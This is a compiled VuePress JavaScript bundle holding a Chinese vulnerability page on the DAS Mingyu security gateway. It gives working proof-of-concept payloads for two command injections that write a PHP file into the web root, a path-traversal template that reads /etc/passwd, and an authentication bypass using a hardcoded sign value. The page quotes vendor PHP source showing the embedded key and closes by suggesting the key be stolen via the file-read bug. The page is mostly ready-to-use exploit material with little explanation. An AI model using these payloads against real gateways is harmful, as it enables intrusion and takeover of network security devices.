import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as p,c as o,a as n,b as s,d as c,e as i}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"安恒信息明御安全网关存在命令执行漏洞，导致攻击者可以直接执行系统命令，从而控制目标系统。",-1),d=n("h2",{id:"漏洞分析",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞分析","aria-hidden":"true"},"#"),s(" 漏洞分析")],-1),k=n("p",null,"参考阅读：",-1),v={href:"https://r0fus0d.blog.ffffffff0x.com/post/oem-case/",target:"_blank",rel:"noopener noreferrer"},m=i(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="命令执行-1" tabindex="-1"><a class="header-anchor" href="#命令执行-1" aria-hidden="true">#</a> 命令执行 1</h3><p>漏洞 URL：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/webui/?g=aaa_portal_auth_local_submit&amp;suffix=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/webui/?g=aaa_portal_auth_local_submit&amp;suffix=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F111111112.php&amp;bkg_flag=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="命令执行-2" tabindex="-1"><a class="header-anchor" href="#命令执行-2" aria-hidden="true">#</a> 命令执行 2</h3><p>漏洞 URL：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/webui/?g=aaa_portal_auth_config_reset&amp;type=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/webui/?g=aaa_portal_auth_config_reset&amp;type=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F111111111.php%0a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="任意文件读取" tabindex="-1"><a class="header-anchor" href="#任意文件读取" aria-hidden="true">#</a> 任意文件读取</h3><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>requests:
  - method: GET
    path:
      - &quot;{{BaseURL}}/webui/?g=sys_dia_data_down&amp;file_name=../etc/passwd&quot;
      - &quot;{{BaseURL}}/webui/?g=sys_dia_data_check&amp;file_name=../../../../../../../../etc/passwd&quot;
      - &quot;{{BaseURL}}/webui/?g=sys_capture_file_download&amp;name=../../../../../../../../etc/passwd&quot;
      - &quot;{{BaseURL}}/webui/?g=sys_corefile_sysinfo_download&amp;name=../../../../../../../../etc/passwd&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="验证码绕过" tabindex="-1"><a class="header-anchor" href="#验证码绕过" aria-hidden="true">#</a> 验证码绕过</h3><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/remote_auth.php?user=admin&amp;pwd=admin&amp;sign=ba84d9dd91eb304aca57f0a8f052623e
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中 sign 硬编码在 <code>/usr/local/webui/remote_auth.php</code> 中：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;user&#39;</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token variable">$usr</span> <span class="token operator">=</span> <span class="token function">formatget</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;user&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;pwd&#39;</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token function">formatget</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;pwd&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;sign&#39;</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">formatget</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;sign&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key</span><span class="token operator">=</span> <span class="token string single-quoted-string">&#39;saplingos!@#$%^&amp;*&#39;</span><span class="token punctuation">;</span><span class="token comment">//这个key你们协商后保存一致即可</span>
<span class="token comment">//ba84d9dd91eb304aca57f0a8f052623e</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$usr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;user_null&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;pwd_null&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sign</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;sign_null&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$sign</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;sign_error&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$usr</span><span class="token punctuation">,</span> <span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name static-context">LoginHandler</span><span class="token operator">::</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$usr</span><span class="token punctuation">,</span> <span class="token variable">$pwd</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">,</span><span class="token variable">$remote_auth</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$fail_msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">LoginHandler</span><span class="token operator">::</span><span class="token function">isLoginFail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$fail_msg</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token constant">ERROR_STR</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$fail_msg</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token variable">$fail_msg</span> <span class="token operator">=</span> <span class="token class-name static-context">LocalUtil</span><span class="token operator">::</span><span class="token function">getCommonResource</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;login_failed&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$fail_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以通过任意文件读取漏洞读取 key，然后进行爆破。</p>`,20);function b(g,_){const a=t("ExternalLinkIcon");return p(),o("div",null,[u,r,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://r0fus0d.blog.ffffffff0x.com/post/oem-case/"),c(a)])])]),m])}const w=e(l,[["render",b],["__file","安恒 明御安全网关 命令执行 任意文件读取漏洞.html.vue"]]);export{w as default};
